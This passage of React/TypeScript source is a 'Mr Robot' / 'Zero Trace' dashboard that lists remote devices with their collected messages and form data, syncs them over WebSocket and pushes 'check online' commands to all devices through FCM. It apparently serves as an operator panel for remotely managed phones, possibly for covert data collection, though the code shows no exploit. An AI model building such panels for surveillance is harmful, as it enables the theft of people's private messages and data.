      // Single /api/init call — replaces 3 parallel requests → 1 round-trip to DB
      const initRes = await apiFetch(`/api/init?appId=${appId}&limit=${FIRST_PAGE}`, { headers: h, signal: controller.signal });
      if (initRes.status === 401) {
        // Delete the orphaned session server-side too, not just locally --
        // otherwise it keeps eating a login-limit slot forever with nobody
        // actually logged in on it.
        const staleSid = localStorage.getItem(`mrrobot_session_id_${appId}`);
        if (staleSid) apiFetch(`/api/admin/sessions/${staleSid}`, { method: "DELETE" }).catch(() => {});
        localStorage.removeItem(`mrrobot_auth_${appId}`);
        localStorage.removeItem(`mrrobot_session_id_${appId}`);
        setAuthed(false); return;
      }
      if (!initRes.ok) throw new Error("API error");
      const { devices: d, messages: firstM, formData: f, totalMessages: totalM } = await initRes.json() as { devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; totalMessages?: number };
      if (totalM != null) setTotalMsgCount(totalM);
      setDevices(d); setMessages(firstM); setFormData(f);
      setError(null);
      const savedDeviceId = localStorage.getItem(DEVICE_KEY);
      if (savedDeviceId) {
        const found = d.find(dev => dev.deviceId === savedDeviceId);
        if (found) setSelectedDevice(found);
      }
      clearTimeout(timeout);
      if (!silent) setLoading(false);

      // Stage 2 — background-load older messages page-by-page
      (async () => {
        let offset = firstM.length;
        if (offset < FIRST_PAGE) return;
        for (;;) {
          try {
            const r = await apiFetch(`/api/messages?appId=${appId}&limit=${PAGE_SIZE}&offset=${offset}`, { headers: { "x-silent": "1" } });
            if (!r.ok) break;
            const page = await r.json() as DbMessage[];
            if (!page.length) break;
            setMessages(prev => {
              const seen = new Set(prev.map(m => m.id));
              const fresh = page.filter(m => !seen.has(m.id));
              return fresh.length ? [...prev, ...fresh] : prev;
            });
            offset += page.length;
            if (page.length < PAGE_SIZE) break;
          } catch { break; }
        }
      })();
    } catch (e) {
      clearTimeout(timeout);
      if (!silent) {
        setError(controller.signal.aborted ? "Connection timed out. Tap Sync to retry." : (e as Error).message);
        setLoading(false);
      }
    }
  }, [appId]);

  // Load data only after authenticated — avoids showing spinner on cold-start before login
  useEffect(() => { if (authed) void loadData(false); }, [authed, loadData]);

  // WebSocket — complete live connection via Cloudflare Durable Object pub-sub
  // Server pushes full device/message objects → client merges directly into state
  useEffect(() => {
    if (!authed) return;
    let ws: WebSocket | null = null;
    let retryTimer: ReturnType<typeof setTimeout> | null = null;
    let closed = false;
    let retryDelay = 2000;

    function connect() {
      if (closed) return;
      const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
      const url = `${proto}//${window.location.host}/api/events`;
      ws = new WebSocket(url);

      ws.onopen = () => {
        setWsConnected(true);
        retryDelay = 2000; // reset backoff on success
      };

      ws.onmessage = (e) => {
        let parsed: { event: string; data: unknown };
        try { parsed = JSON.parse(typeof e.data === "string" ? e.data : ""); }
        catch { return; }
        const { event, data } = parsed;

        if (event === "device_updated") {
          const device = data as DbDevice;
          if (device.appId !== appId) return;
          window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: { deviceId: device.deviceId } }));
          setDevices(prev => {
            const idx = prev.findIndex(d => d.deviceId === device.deviceId);
            if (idx === -1) return [device, ...prev];
            const next = [...prev];
            next[idx] = device;
            return next;
          });
          setSelectedDevice(sel => sel?.deviceId === device.deviceId ? device : sel);
          const savedId = localStorage.getItem(DEVICE_KEY);
          if (savedId === device.deviceId) setSelectedDevice(device);
        } else if (event === "message_added") {
          const payload = data as { appId: string; message: DbMessage };
          if (payload.appId !== appId) return;
          setMessages(prev => {
            if (prev.some(m => m.id === payload.message.id)) return prev;
            return [payload.message, ...prev];
          });
          setTotalMsgCount(prev => prev + 1);
        } else if (event === "form_data_added") {
          const payload = data as { appId: string; formData: DbFormData };
          if (payload.appId !== appId) return;
          setFormData(prev => {
            if (prev.some(f => f.id === payload.formData.id)) return prev;
            return [payload.formData, ...prev];
          });
        } else if (event === "form_data_deleted") {
          const payload = data as { appId: string; id: number };
          if (payload.appId !== appId) return;
          setFormData(prev => prev.filter(f => f.id !== payload.id));
        } else if (event === "form_data_bulk_deleted") {
          const payload = data as { appId: string; deviceId: string; ids: number[] };
          if (payload.appId !== appId) return;
          setFormData(prev => prev.filter(f => f.deviceId !== payload.deviceId));
        } else if (event === "message_deleted") {
          const payload = data as { appId: string; deviceId: string; id: number };
          if (payload.appId !== appId) return;
          setMessages(prev => prev.filter(m => m.id !== payload.id));
          setTotalMsgCount(prev => Math.max(0, prev - 1));
        } else if (event === "bulk_deleted") {
          // Master "clear all messages for app" — was previously only reflected after a
          // manual refresh because no client-side handler existed for this event at all.
          const payload = data as { appId: string; count: number };
          if (payload.appId !== appId) return;
          setMessages([]);
          setTotalMsgCount(0);
        } else if (event === "device_deleted") {
          const payload = data as { appId: string; deviceId: string };
          if (payload.appId !== appId) return;
          setDevices(prev => prev.filter(d => d.deviceId !== payload.deviceId));
          setMessages(prev => {
            const removed = prev.filter(m => m.deviceId === payload.deviceId).length;
            setTotalMsgCount(c => Math.max(0, c - removed));
            return prev.filter(m => m.deviceId !== payload.deviceId);
          });
          setFormData(prev => prev.filter(f => f.deviceId !== payload.deviceId));
          setSelectedDevice(sel => sel?.deviceId === payload.deviceId ? null : sel);
          if (localStorage.getItem(DEVICE_KEY) === payload.deviceId) {
            localStorage.removeItem(DEVICE_KEY);
          }
        }
      };

      ws.onclose = () => {
        setWsConnected(false);
        if (closed) return;
        // exponential backoff: 2s → 4s → 8s → cap 30s
        retryTimer = setTimeout(connect, retryDelay);
        retryDelay = Math.min(retryDelay * 2, 30000);
      };
      ws.onerror = () => {
        setWsConnected(false);
        try { ws?.close(); } catch {}
      };
    }

    connect();
    return () => {
      closed = true;
      setWsConnected(false);
      if (retryTimer) clearTimeout(retryTimer);
      try { ws?.close(); } catch {}
    };
  }, [authed, appId]);

  // Polling fallback — jab WebSocket connected nahi, har 20s mein data refresh karo
  const wsConnectedRef = useRef(wsConnected);
  useEffect(() => { wsConnectedRef.current = wsConnected; }, [wsConnected]);
  useEffect(() => {
    if (!authed) return;
    const t = setInterval(() => {
      if (!wsConnectedRef.current) void loadData(true);
    }, 20000);
    return () => clearInterval(t);
  }, [authed, loadData]);

  async function handleManualRefresh() {
    setRefreshing(true);
    await loadData(true);
    setRefreshing(false);
  }

  const totalDevices = devices.length;
  const recentCount = devices.filter(d => isRecent(d.lastOnline)).length;
  const favoritesCount = devices.filter(d => d.starred).length;
  const displayDevices = devices
    .filter(d => (filterRecent ? isRecent(d.lastOnline) : true))
    .filter(d => (filterFavorites ? d.starred : true));

  async function handleCheckAll() {
    if (checkAllState === "running") return;
    // latest → oldest: reverse of DB insertion order
    const allDevices = [...devices].reverse();
    if (!allDevices.length) { setCheckAllState("done"); setTimeout(() => setCheckAllState("idle"), 2500); return; }

    const BATCH_SIZE = 10;
    const BATCH_DELAY_MS = 300;

    setCheckAllState("running");
    setCheckAllDone(0);
    setCheckAllTotal(allDevices.length);
    setCheckAllResult(null);
    let ok = 0; let fail = 0;

    for (let i = 0; i < allDevices.length; i += BATCH_SIZE) {
      const batch = allDevices.slice(i, i + BATCH_SIZE);
      const results = await Promise.allSettled(
        batch.map(d =>
          fcmSend(d.deviceId, mkCheckOnline())
        )
      );
      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
      setCheckAllDone(Math.min(i + BATCH_SIZE, allDevices.length));
      if (i + BATCH_SIZE < allDevices.length) {
        await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
      }
    }

    setCheckAllResult({ ok, fail });
    setCheckAllState("done");
    setTimeout(() => { setCheckAllState("idle"); setCheckAllDone(0); setCheckAllTotal(0); setCheckAllResult(null); }, 4000);
  }

  const NAV: { key: Page; label: string }[] = [
    { key: "home", label: "Home" },
    { key: "messages", label: "Messages" },
    { key: "groups", label: "Groups" },
    { key: "devices", label: "Devices" },
    { key: "settings", label: "Settings" },
  ];

  function handleLogout() {
    const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
    if (sid) apiFetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
    localStorage.removeItem(`mrrobot_auth_${appId}`);
    localStorage.removeItem(`mrrobot_session_id_${appId}`);
    sessionStorage.removeItem(`mrrobot_jwt_${appId}`);
    setAuthed(false);
  }

  if (!authed) {
    const isDark = typeof window !== "undefined" && window.matchMedia?.("(prefers-color-scheme: dark)").matches;
    return (
      <ThemeCtx.Provider value={isDark ? DT : LT}>
        <LoginPage
          onAuth={() => setAuthed(true)}
          onSetAppId={(id) => { setAppId(id); }}
        />
      </ThemeCtx.Provider>
    );
  }

  const theme = isZeroTrace ? ZT : (effectiveDark ? DT : LT);
  // Zero Trace accent helpers (used in login page + SVGs)
  const ZT_ACCENT = "#1d4ed8";
  const ZT_ACCENT_LIGHT = "#60a5fa";

  return (
    <ThemeCtx.Provider value={theme}>
    <DeleteProtCtx.Provider value={deleteProtEnabled}>
    <div style={{ height: "100dvh", background: theme.bg, fontFamily: "system-ui,-apple-system,'Segoe UI',sans-serif", color: theme.txt, display: "flex", justifyContent: "center" }}>
      <div style={{ width: "100%", maxWidth: 440, height: "100dvh", display: "flex", flexDirection: "column", background: theme.bg }}>

        {/* Header + Tab nav — single sticky block so tabs never overlap header */}
        <div style={{ position: "sticky", top: 0, zIndex: 50 }}>
        <div style={{ background: theme.card, borderBottom: `1px solid ${theme.cardB}` }}>
        <div className="header-scroll" style={{ padding: "8px 14px", display: "flex", alignItems: "center", gap: 14, overflowX: "auto", scrollbarWidth: "thin", scrollbarColor: `${isZeroTrace ? "#1d4ed8" : theme.accent} transparent` }}>
          {/* Left: logo + name — never shrink */}
          <div style={{ display: "flex", alignItems: "center", gap: 9, flexShrink: 0 }}>
{isZeroTrace ? (
              /* Zero Trace — crosshair reticle */
              <svg width="30" height="30" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="20" cy="20" r="18" stroke="#1d4ed8" strokeWidth="1" strokeDasharray="3 2.5" opacity="0.5"/>
                <circle cx="20" cy="20" r="11" stroke="#1d4ed8" strokeWidth="1.4"/>
                <circle cx="20" cy="20" r="5.5" stroke="#3b82f6" strokeWidth="1" opacity="0.8"/>
                <circle cx="20" cy="20" r="2" fill="#60a5fa"/>
                <line x1="20" y1="1" x2="20" y2="9.5" stroke="#1d4ed8" strokeWidth="1.5" strokeLinecap="round"/>
                <line x1="20" y1="30.5" x2="20" y2="39" stroke="#1d4ed8" strokeWidth="1.5" strokeLinecap="round"/>
                <line x1="1" y1="20" x2="9.5" y2="20" stroke="#1d4ed8" strokeWidth="1.5" strokeLinecap="round"/>
                <line x1="30.5" y1="20" x2="39" y2="20" stroke="#1d4ed8" strokeWidth="1.5" strokeLinecap="round"/>
                <path d="M30 10 L34 10 L34 14" stroke="#3b82f6" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round" opacity="0.75"/>
                <path d="M10 10 L6 10 L6 14" stroke="#3b82f6" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round" opacity="0.75"/>
                <path d="M30 30 L34 30 L34 26" stroke="#3b82f6" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round" opacity="0.75"/>
                <path d="M10 30 L6 30 L6 26" stroke="#3b82f6" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round" opacity="0.75"/>
              </svg>
            ) : (
              /* Mr Robot — original robot SVG untouched */
              <svg width="30" height="30" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg">
                <line x1="17" y1="1" x2="17" y2="7" stroke={theme.accent} strokeWidth="1.8" strokeLinecap="round"/>
                <circle cx="17" cy="1.5" r="2" fill={theme.accent}/>
                <rect x="3" y="7" width="28" height="22" rx="5" fill={effectiveDark ? "#2e3a5c" : "#e0e7ff"} stroke={theme.accent} strokeWidth="1.5"/>
                <rect x="8" y="13" width="6" height="6" rx="1.5" fill={theme.accent}/>
                <rect x="20" y="13" width="6" height="6" rx="1.5" fill={theme.accent}/>
                <rect x="2" y="16" width="2" height="5" rx="1" fill={effectiveDark ? "#4a5a8a" : "#c7d2fe"}/>
                <rect x="30" y="16" width="2" height="5" rx="1" fill={effectiveDark ? "#4a5a8a" : "#c7d2fe"}/>
                <rect x="8" y="22" width="18" height="4" rx="1.5" fill={effectiveDark ? "#1e293b" : "#c7d2fe"}/>
                <rect x="10" y="22" width="3" height="4" rx="1" fill={theme.accent}/>
                <rect x="15.5" y="22" width="3" height="4" rx="1" fill={theme.accent}/>
                <rect x="21" y="22" width="3" height="4" rx="1" fill={theme.accent}/>
              </svg>
            )}
            <div>
              <div style={{ color: theme.txt, fontWeight: 900, fontSize: 13, letterSpacing: 1, whiteSpace: "nowrap" }}>{appName}</div>
            </div>
          </div>

          {/* Right: pills row — flexShrink:0 so parent scroll handles overflow */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, flexShrink: 0 }}>

            {/* 15-min online pill — clickable filter toggle */}
            <button
              onClick={() => setFilterRecent(f => !f)}
              style={{
                display: "flex", alignItems: "center", gap: 5, flexShrink: 0,
                background: filterRecent ? "#4ade80" : "#052e16",
                border: `1px solid ${filterRecent ? "#4ade80" : "#166534"}`,
                borderRadius: 20, padding: "4px 10px",
                cursor: "pointer",
                boxShadow: filterRecent ? "0 0 10px #4ade8066" : "none",
                transition: "all 0.15s",
              }}
            >
              <span style={{
                width: 6, height: 6, borderRadius: "50%",
                background: filterRecent ? "#052e16" : "#4ade80",
                boxShadow: filterRecent ? "none" : "0 0 6px #4ade80",
                display: "inline-block", flexShrink: 0,
              }} />
              <span style={{ fontSize: 11, fontWeight: 700, color: filterRecent ? "#052e16" : "#4ade80", lineHeight: 1 }}>
                {recentCount}
              </span>
              <span style={{ fontSize: 9, color: filterRecent ? "#166534" : "#86efac", fontWeight: 600, lineHeight: 1 }}>
                /15m
              </span>
            </button>

            {/* Favorites pill — clickable filter toggle, shows only starred devices */}
            <button
              onClick={() => setFilterFavorites(f => !f)}
              title={filterFavorites ? "Show all devices" : "Show favorites only"}
              style={{
                display: "flex", alignItems: "center", gap: 5, flexShrink: 0,
                background: filterFavorites ? "#f59e0b" : "#3a2a05",
                border: `1px solid ${filterFavorites ? "#f59e0b" : "#92650a"}`,
                borderRadius: 20, padding: "4px 10px",
                cursor: "pointer",
                boxShadow: filterFavorites ? "0 0 10px #f59e0b66" : "none",
                transition: "all 0.15s",
              }}
            >
              <svg width="11" height="11" viewBox="0 0 24 24" fill={filterFavorites ? "#3a2a05" : "#f59e0b"} stroke={filterFavorites ? "#3a2a05" : "#f59e0b"} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
              </svg>
              <span style={{ fontSize: 11, fontWeight: 700, color: filterFavorites ? "#3a2a05" : "#f59e0b", lineHeight: 1 }}>
                {favoritesCount}
              </span>
            </button>

            {/* Live connection status pill */}
            <span style={{
              display: "flex", alignItems: "center", gap: 5, flexShrink: 0,
              background: wsConnected ? "#052e16" : "#450a0a",
              border: `1px solid ${wsConnected ? "#166534" : "#991b1b"}`,
              borderRadius: 20, padding: "4px 10px",
              transition: "all 0.15s",
            }}>
              <span style={{
                width: 6, height: 6, borderRadius: "50%", flexShrink: 0,
                background: wsConnected ? "#4ade80" : "#f87171",
                boxShadow: wsConnected ? "0 0 6px #4ade80" : "0 0 6px #f87171",
                display: "inline-block",
              }} />
              <span style={{ fontSize: 10, fontWeight: 700, lineHeight: 1, color: wsConnected ? "#4ade80" : "#f87171" }}>
                {wsConnected ? "Connected" : "Disconnected"}
              </span>
            </span>

            {/* Manual Refresh button */}
            <button
              onClick={() => void handleManualRefresh()}
              disabled={refreshing}
              title="Refresh devices & messages"
              style={{
                display: "flex", alignItems: "center", gap: 4, flexShrink: 0,
                background: "#0f172a", border: "1px solid #334155",
                borderRadius: 20, padding: "4px 10px", cursor: refreshing ? "wait" : "pointer",
              }}
            >
              <svg width="10" height="10" viewBox="0 0 10 10" fill="none"
                style={{ transform: refreshing ? "rotate(360deg)" : "none", transition: refreshing ? "transform 0.6s linear" : "none" }}>
                <path d="M5 1.5A3.5 3.5 0 1 1 1.5 5" stroke={refreshing ? "#60a5fa" : "#94a3b8"} strokeWidth="1.5" strokeLinecap="round"/>
                <polyline points="1.5,2.5 1.5,5 4,5" stroke={refreshing ? "#60a5fa" : "#94a3b8"} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
              <span style={{ fontSize: 10, fontWeight: 700, color: refreshing ? "#60a5fa" : "#94a3b8", lineHeight: 1 }}>
                {refreshing ? "…" : "Sync"}
              </span>
            </button>

            {/* Check Online All pill button */}
            <button
              onClick={() => void handleCheckAll()}
              disabled={checkAllState === "running"}
              style={{
                display: "flex", alignItems: "center", gap: 5, flexShrink: 0,
                background: checkAllState === "done"
                  ? "#052e16"
                  : checkAllState === "running"
                  ? "#1e1b4b"
                  : "#1e1b4b",
                border: `1px solid ${checkAllState === "done" ? "#166534" : "#4f46e5"}`,
                borderRadius: 20, padding: "4px 10px",
                cursor: checkAllState === "running" ? "wait" : "pointer",
              }}
            >
              {/* icon */}
              <svg width="10" height="10" viewBox="0 0 10 10" fill="none">
                {checkAllState === "done"
                  ? <polyline points="1.5,5 4,7.5 8.5,2" stroke="#4ade80" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
                  : checkAllState === "running"
                  ? <circle cx="5" cy="5" r="3.5" stroke="#818cf8" strokeWidth="1.5" strokeDasharray="5 3"/>
                  : <><circle cx="5" cy="5" r="3.5" stroke="#818cf8" strokeWidth="1.5"/><polygon points="4,3.2 7.5,5 4,6.8" fill="#818cf8"/></>
                }
              </svg>
              <span style={{
                fontSize: 10, fontWeight: 700, lineHeight: 1, whiteSpace: "nowrap",
                color: checkAllState === "done" ? "#4ade80" : "#a5b4fc",
              }}>
                {checkAllState === "running"
                  ? `${checkAllDone}/${checkAllTotal}`
                  : checkAllState === "done"
                  ? "Sent!"
                  : "Ping All"}
              </span>
            </button>

          </div>
        </div>
        {/* Ping All progress bar / result */}
        {checkAllState === "running" && (
          <div style={{ height: 3, background: "#1e1b4b", overflow: "hidden" }}>
            <div style={{ height: "100%", background: theme.accent, width: `${checkAllTotal > 0 ? Math.round((checkAllDone / checkAllTotal) * 100) : 0}%`, transition: "width 0.4s ease" }} />
          </div>
        )}
        {checkAllState === "done" && checkAllResult && (
          <div style={{ padding: "3px 14px", display: "flex", alignItems: "center", gap: 8, background: "#0f172a" }}>
            <span style={{ fontSize: 10, fontWeight: 700, color: "#4ade80" }}>✓ {checkAllResult.ok} sent</span>
            {checkAllResult.fail > 0 && (
              <span style={{ fontSize: 10, fontWeight: 700, color: "#f59e0b" }}>· ✗ {checkAllResult.fail} failed</span>
            )}
          </div>
        )}
        </div>


        
        {/* ── Announcement Ticker — dynamic from DB ── */}
        {tickerNotices.length > 0 && (() => {
          const tkBg   = effectiveDark ? "#0f172a" : "#fffbeb";
          const tkText = effectiveDark ? "#fbbf24" : "#92400e";
          const tkIcon = effectiveDark ? "#f97316" : "#d97706";
          const tkBdr  = effectiveDark ? "1.5px solid #f59e0b40" : "1.5px solid #d9770650";
          const combined = tickerNotices.join("   ·   ");
          return (
            <div style={{ background: tkBg, overflow: "hidden", padding: "6px 0", borderBottom: tkBdr, borderTop: tkBdr }}>
              <style>{"@keyframes ticker-loop { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }"}</style>
              <div style={{ display: "inline-flex", whiteSpace: "nowrap", animation: "ticker-loop 30s linear infinite", willChange: "transform" }}>
                {[0,1].map(i => (
                  <span key={i} style={{ fontSize: 12, fontWeight: 700, color: tkText, letterSpacing: 0.4, paddingRight: 80, display: "inline-flex", alignItems: "center", gap: 10 }}>
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke={tkIcon} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
                    <span>{combined}</span>
                  </span>
                ))}
              </div>
            </div>
          );
        })()}
        {/* Tab nav */}
        <div style={{ background: theme.hdr, display: "flex", borderBottom: `2px solid ${theme.cardB}` }}>
          {NAV.map(({ key, label }) => {
            const active = page === key;
            return (
              <button key={key} onClick={() => { setPage(key); setSelectedDevice(null); setScrollToMsgId(null); }} style={{
                flex: 1, padding: "10px 2px", border: "none", background: "none",
                cursor: "pointer", fontSize: 14,
                fontWeight: active ? 700 : 400,
                color: active ? theme.accent : "#64748b",
                borderBottom: active ? `2px solid ${theme.accent}` : "2px solid transparent",
                marginBottom: -2,
              }}>
                {label}
              </button>
            );
          })}
        </div>
        </div>{/* end sticky outer wrapper */}

        {/* Content */}
        {loading && (
          <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
            <CircularLoader size={56} label="Loading data…" color={theme.accent} labelColor="#94a3b8" />
          </div>
        )}
        {!loading && error && (
          <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
            <div style={{ fontSize: 13, color: "#ef4444", fontWeight: 600 }}>Error: {error}</div>
            <div style={{ fontSize: 11, color: "#94a3b8" }}>Check that the API server is running.</div>
          </div>
        )}
        {!loading && !error && (
          <>
            <div id="main-scroll" style={{ flex: 1, overflowY: "auto", minHeight: 0, overscrollBehavior: "contain" }}>
              {page === "home" && <HomePage devices={devices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "home" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={homeMsgCountRef.current} onCountChange={n => { homeMsgCountRef.current = n; }} favoritesOnly={filterFavorites} recentOnly={filterRecent} />}
              {page === "messages" && <MessagesPage appId={appId} messages={messages} devices={devices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={msgPageCountRef.current} onCountChange={n => { msgPageCountRef.current = n; }} favoritesOnly={filterFavorites} recentOnly={filterRecent} liveTotal={totalMsgCount} />}
              {page === "groups" && <GroupsPage devices={devices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} initialCount={groupsCountRef.current} onCountChange={n => { groupsCountRef.current = n; }} favoritesOnly={filterFavorites} recentOnly={filterRecent} />}
              {page === "devices" && <DevicesPage appId={appId} devices={displayDevices} messages={messages} formData={formData} initialDevice={selectedDevice} onBack={onBack} initialCount={devicesCountRef.current} onCountChange={n => { devicesCountRef.current = n; }} />}
              {page === "settings" && <SettingsPage appId={appId} isDark={effectiveDark} onToggleDark={toggleDark} devices={displayDevices} onLogout={handleLogout} msgCount={totalMsgCount || messages.length} isZeroTrace={isZeroTrace} onDeleteProtEnabledChange={setDeleteProtEnabled} />}
            </div>
            <ScrollToTopBtn />
          </>
        )}
      </div>
    </div>
    </DeleteProtCtx.Provider>
    </ThemeCtx.Provider>
  );
}



  export function SubAdminLoginPage() {
    const params = useParams<{ appId?: string }>();
    const queryAppId = new URLSearchParams(window.location.search).get("appId") || "";
    const prefillToken = (params.appId || queryAppId).trim();

    // Check if already authenticated — show dashboard inline (URL stays at /login/:appId)
    const [authed, setAuthed] = useState(() => {
      const aid = sessionStorage.getItem("mrrobot_active_appid") || "";
      if (!aid) return false;
      // If URL has a specific appId and it doesn't match logged-in app → force login
      if (prefillToken && aid.toUpperCase() !== prefillToken.toUpperCase()) return false;
      return !!sessionStorage.getItem(`mrrobot_jwt_${aid}`) &&
             localStorage.getItem(`mrrobot_auth_${aid}`) === "1";
    });

    // If URL appId changes while dashboard is open → logout and show login for new appId
    useEffect(() => {
      if (!authed) return;
      const currentAid = sessionStorage.getItem("mrrobot_active_appid") || "";
      if (prefillToken && currentAid.toUpperCase() !== prefillToken.toUpperCase()) {
        setAuthed(false);
      }
    }, [prefillToken]);

    // If authenticated, render dashboard at this same URL — no redirect
    if (authed) return <WebDashboard />;

    const isDark = typeof window !== "undefined" && window.matchMedia?.("(prefers-color-scheme: dark)").matches;
    return (
      <ThemeCtx.Provider value={isDark ? DT : LT}>
        <LoginPage
          prefillAppId={prefillToken || undefined}
          onAuth={() => setAuthed(true)}
          onSetAppId={() => {}}
        />
      </ThemeCtx.Provider>
    );
  }
  